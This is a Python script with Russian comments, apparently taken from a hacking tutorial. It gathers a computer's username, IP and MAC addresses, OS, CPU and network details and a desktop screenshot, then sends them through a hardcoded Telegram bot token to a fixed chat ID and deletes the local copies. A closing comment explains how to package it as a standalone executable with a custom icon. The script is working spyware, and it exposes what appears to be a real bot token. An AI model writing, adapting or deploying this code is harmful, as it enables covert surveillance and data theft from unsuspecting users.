# -*- coding: utf-8 -*-
import getpass
import os
import socket
from datetime import datetime, timezone
from uuid import getnode as get_mac
import pyautogui
from speedtest import Speedtest
import telebot
import psutil
import platform
from PIL import Image
import codecs


# (ПОЛЕЗНАЯ ШТУКА: ipconfig/all => cmd)
token = '5242212667:AAGRIKJiOlzudrlGaWgitF_uh4tOIBkMPto'
bot = telebot.TeleBot(token) # Подключение бота
start = datetime.now() # Начало отчета


# code here...
name = getpass.getuser() # Имя пользователя
ip = socket.gethostbyname(socket.getfqdn()) # IP-адрес системы
mac = get_mac() # MAC адрес
ost = platform.uname() # Название операционной системы

# Оценка скорости соединения с интернетом
inet = Speedtest()
download = float(str(inet.download())[0:2] + "."
                 + str(round(inet.download(), 2))[1]) * 0.125
uploads = float(str(inet.upload())[0:2] + "."
                + str(round(inet.download(), 2))[1]) * 0.125

# Часовой пояс и время
zone = psutil.boot_time() # Узнает время, заданное на компьютере
time = datetime.fromtimestamp(zone) # Переводит данные в читаемый вид

# Частота процессора
cpu = psutil.cpu_freq()
# => Мо­жет помочь выявить при­чину тор­мозну­тос­ти компь­юте­ра: если про­цес­сор пос­тоян­но молотит на пол­ную, но прог­раммы вис­нут — про­цес­сор уста­рел, а если прос­таивает — винова­та прог­рамма. Да и прос­то общее пред­став­ление о железе дает.

# Скриншот рабочего стола
os.getcwd()

try: # Перехватывает ошибки в случае неверно указанного расположения
    os.chdir(r'C:/temp/path')
except OSError:
    @bot.message_handler(commands=['start'])
    def start_message(message): # Служебная обвязка для бота
        bot.send_message(message.chat.id, '[Error]: Location not found!')
        bot.stop_polling()
    
    bot.polling()
    raise SystemExit

screen = pyautogui.screenshot('screenshot.jpg') # Снятие скриншота

# Запись в файл
try: # Обвязка для обработки команд боту
    os.chdir(r'C:/temp/path')
except OSError:
    @bot.message_handler(commands=['start'])
    def start_message(message):
        bot.send_message(5039478543, '[Error]: Location not found!')
        bot.stop_polling()
    
    bot.polling()
    raise SystemExit

ends = datetime.now() # Конец отчета
workspeed = format(ends - start) # Вычисление времени

file = open('info.txt', 'w') # Открываем файл
file.write(f"[================================================]\n  Operating System: {ost.system}\n  Processor: {ost.processor}\n  Username: {name}\n  IP adress: {ip}\n  MAC adress: {mac}\n  Timezone: {time.year}/{time.month}/{time.day} {time.hour}:{time.minute}:{time.second}\n  Work speed: {workspeed}\n  Download: {download} MB/s\n  Upload: {uploads} MB/s\n  Max Frequency: {cpu.max:.2f} Mhz\n  Min Frequency: {cpu.min:.2f} Mhz\n  Current Frequency: {cpu.current:.2f} Mhz\n[================================================]\n")
file.close() # Закрываем

# Отправка данных (скриншота)
text = 'Screenshot' # Требуется при создании скриншота (текст к фото)

@bot.message_handler(commands=['start']) # Выполняет действия при команде: start
def start_message(message):
    upfile = open('info.txt', 'rb')
    uphoto = open('screenshot.jpg', 'rb')
    bot.send_photo(5039478543, uphoto, text)
    bot.send_document(5039478543, upfile)

    upfile.close()
    uphoto.close()

    os.remove('info.txt')
    os.remove('screenshot.jpg')

    bot.stop_polling()

bot.polling()

# Пе­рехо­дим с помощью коман­дной стро­ки в пап­ку с нашей прог­раммой и собира­ем ее коман­дой:
# pyinstaller -i путь_до_иконки --onefile наш_файл.py